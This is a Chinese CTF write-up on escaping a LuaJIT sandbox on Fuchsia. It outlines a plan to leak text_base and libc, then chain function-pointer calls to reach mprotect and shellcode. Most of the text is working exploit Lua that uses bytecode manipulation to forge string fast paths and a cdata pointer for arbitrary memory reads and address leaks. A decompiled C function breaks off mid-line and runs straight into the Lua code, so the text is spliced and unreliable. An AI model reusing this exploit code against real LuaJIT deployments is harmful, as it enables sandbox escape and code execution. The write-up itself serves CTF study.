# Frawler(2)
上一篇我们主要分析了现成的luajit沙箱逃逸exp为什么不能直接使用，过程中我们弄明白了luajit的原理了，这下对我们在zircon内进行分析就有一定好处了，因为在zircon内没有调试器可以用（或者是我不方便编译出来使用），所以对luajit的熟悉可以让我们一方面快速识别出内嵌在目标可执行文件内的luajit代码，从而明白到底现在在发生什么。
虽然没有调试器，但是在fuchsia内如果触发了setfault是会有dump信息显示在fuchsia boot
console里的，这也是为什么我们具有没有调试器也可以把exp调出来的可能。
在这一部分我首先讲述一下我按照@david492j的思路，以及参考他的exp完成我的exp的过程，最后再来分析为什么在linux里调试成功的luajit沙箱逃逸代码在fuchsia里没起作用。
## david的思路
这里再次感谢@david492j不吝啬与我这样的菜鸡分享思路。。
### 精准猜测
按照他的说法，由于之前"PANIC"的信息（在上一篇中已经分析了为什么会出现这样的信息），他们以为在fuchsia内jit是不能直接使用的。这么看他们应该是直接在fuchsia内进行操作了，这里可以看出真正大佬的自信。。我完全不敢保证在没有调试器的情况下我的代码和我想的一样。。这也是为什么我会非常需要在linux里先调试一遍。
不过这非常巧妙的让他们绕过了一个大坑。。因为事实上我们上一篇中调好的luajit沙箱逃逸代码并不能使用，具体原因我在后文会尝试去分析。
### 大佬的思路
按照他们的思路，在原exp中虽然不能直接使用，但是其中的任意地址读写（其实后来调试发现是4字节范围内）和任意地址调用是可以使用的，我分开测试也发现了这一点。
所以他们采用了直接利用任意读写和泄露去完成利用。
回想一下我们在fuchsia内和linux利用上的几点不同：
  1. 无法调试（这一点可以通过查看崩溃时的dump日志来解决）
  2. 无法直接进行系统调用
其他部分似乎差距并不大，所以思路上也没有太大差距：
  1. 泄露text_base
  2. 有了text_base配合任意读写可以泄露libc(ld.so.1，在fuchsia内与libc为同一个文件）
  3. 之后有任意地址调用，可以调用mprotect之后再跳到shellcode。
但是第3点就需要有连续两次能控制的跳转，第一次跳转到mprotect，第二次跳转到shellcode。由于目标代码有luajit，mprotect并不是一个很大的问题，我们可以直接复用luajit内的mprotect的部分。之后第二次跳转到shellcode。但是如何去找到连续两个能控制的跳转呢？
这里就不得不佩服大佬的思路了。回想一下哪里的函数指针最多？当然是`FILE`结构体啦，于是在`FILE`相关的函数附近，大佬使用了`fflush`，我自己也找了一下，还发现了libc内`0x32e50`位置的函数也是两个连续的函数指针调用：
    __int64 __fastcall sub_32E50(int64_t *a1, __int64 a2, unsigned int a3)
    {
      __int64 v3; // r13
      unsigned int v4; // er12
      __int64 result; // rax
      v3 = a2;
      v4 = a3;
      if ( a3 == 1 )
        v3 = a2 - (a1[2] - a1[1]);
      if ( a1[5] > (unsigned __int64)a1[7] )
      {
        ((void (__fastcall *)(int64_t *, _QWORD, _QWORD))a1[9])(a1, 0LL, 0LL); // : NULL`.
          -- The `if false` wrapper ensures that the munged bytecode
          -- isn't executed.
          local cdata = -32749
          cdata = 0
          cdata = 0
        end
        -- Through the power of bytecode manipulation, the
        -- following three functions will become (the fast paths of)
        -- string.byte, string.char, and string.sub. This is
        -- possible because LuaJIT has bytecode instructions
        -- corresponding to the fast paths of said functions. Note
        -- that we musn't stray from the fast path (because the
        -- fallback C code won't be wired up). Also note that the
        -- interpreter state will be slightly messed up after
        -- calling one of these functions.
        local function s_byte(s) end
        local function s_char(i, _) end
        local function s_sub(s, i, j) end
        -- The following function does nothing, but calling it will
        -- restore the interpreter state which was messed up following
        -- a call to one of the previous three functions. Because this
        -- function contains a cdata literal, loading it from bytecode
        -- will result in the ffi library being initialised (but not
        -- registered in the global namespace).
        local function resync() return 0LL end
        -- Helper function to reinterpret the first four bytes of a
        -- string as a uint32_t, and return said value as a number.
        local function s_uint32(s)
          local result = 0
          for i = 4, 1, -1 do
            result = result * 256 + s_byte(s_sub(s, i, i))
            resync()
          end
          return result
        end
        -- The following line obtains the address of the GCfuncL
        -- object corresponding to "inner". As written, it just fetches
        -- the 0th upvalue, and does some arithmetic. After some
        -- bytecode manipulation, the 0th upvalue ends up pointing
        -- somewhere very interesting: the frame info TValue containing
        -- func|FRAME_VARG|delta. Because delta is small, this TValue
        -- will end up being a denormalised number, from which we can
        -- easily pull out 32 bits to give us the "func" part.
        local iaddr = (inner * 2^1022 * 2^52) % 2^32
        -- The following five lines read the "pc" field of the GCfuncL
        -- we just obtained. This is done by creating a GCstr object
        -- overlaying the GCfuncL, and then pulling some bytes out of
        -- the string. Bytecode manipulation results in a nice KPRI
        -- instruction which preserves the low 32 bits of the istr
        -- TValue while changing the high 32 bits to specify that the
        -- low 32 bits contain a GCstr*.
        local istr = (iaddr - 4) + 2^52
        istr = -32764 -- Turned into KPRI(str)
        local pc = s_sub(istr, 5, 8)
        istr = resync()
        pc = s_uint32(pc)
        -- The following three lines result in the local variable
        -- called "memory" being `cdata: NULL`. We can
        -- subsequently use this variable to read arbitrary memory
        -- (one byte at a time). Note again the KPRI trick to change
        -- the high 32 bits of a TValue. In this case, the low 32 bits
        -- end up pointing to the bytecode instructions at the top of
        -- this function wrapped in `if false`.
        local memory = (pc + 8) + 2^52
        memory = -32758 -- Turned into KPRI(cdata)
        memory = memory + 0
        -- Helper function to read a uint32_t from any memory location.
        local function m_uint32(offs)
          local result = 0
          for i = offs + 3, offs, -1 do
            result = result * 256 + (memory[i] % 256)
          end
          return result
        end
        local function m_uint64(offs)
            local result = 0
            for i = offs + 7, offs, -1 do
                result = result * 256 + (memory[i] % 256)
            end
            return result
        end
        -- Helper function to extract the low 32 bits of a TValue.
        -- In particular, for TValues containing a GCobj*, this gives
        -- the GCobj* as a uint32_t. Note that the two memory reads
        -- here are GCfuncL::uvptr[1] and GCupval::v.
        local vaddr = m_uint32(m_uint32(iaddr + 24) + 16)
        local function low32(tv)
          v = tv
          res = m_uint32(vaddr)
          return res
        end
        -- Helper function which is the inverse of s_uint32: given a
        -- 32 bit number, returns a four byte string.
        local function ub4(n)
          local result = ""
          for i = 0, 3 do
            local b = n % 256
            n = (n - b) / 256
            result = result .. s_char(b)
            resync()
          end
          return result
        end
        local function ub8(n)
            local result = ""
            for i = 0, 7 do
                local b = n % 256
                n = (n - b) / 256
                result = result .. s_char(b)
                resync()
            end
            return result
        end
        local function hexdump_print(addr, len)
            local result = ''
            for i = 0, len - 1 do
                if i % 16 == 0 and i ~= 0 then
                    result = result .. '\n'
                end
                result = result .. string.format('%02x', memory[addr + i] % 0x100) .. ' '
            end
            print(result)
        end
        local function hexdump_tv(tv)
            v = tv
            hexdump_print(vaddr, 8)
        end
        local text_base = m_uint64(low32("") - 4 + 0x80) - 0x29090
        --print('got text_base @ 0x' .. string.format('%x', text_base))
        local strlen_got = text_base + 0x74058
        local strlen_addr = m_uint64(strlen_got)
        --print('strlen got @ 0x' .. string.format('%x', strlen_addr))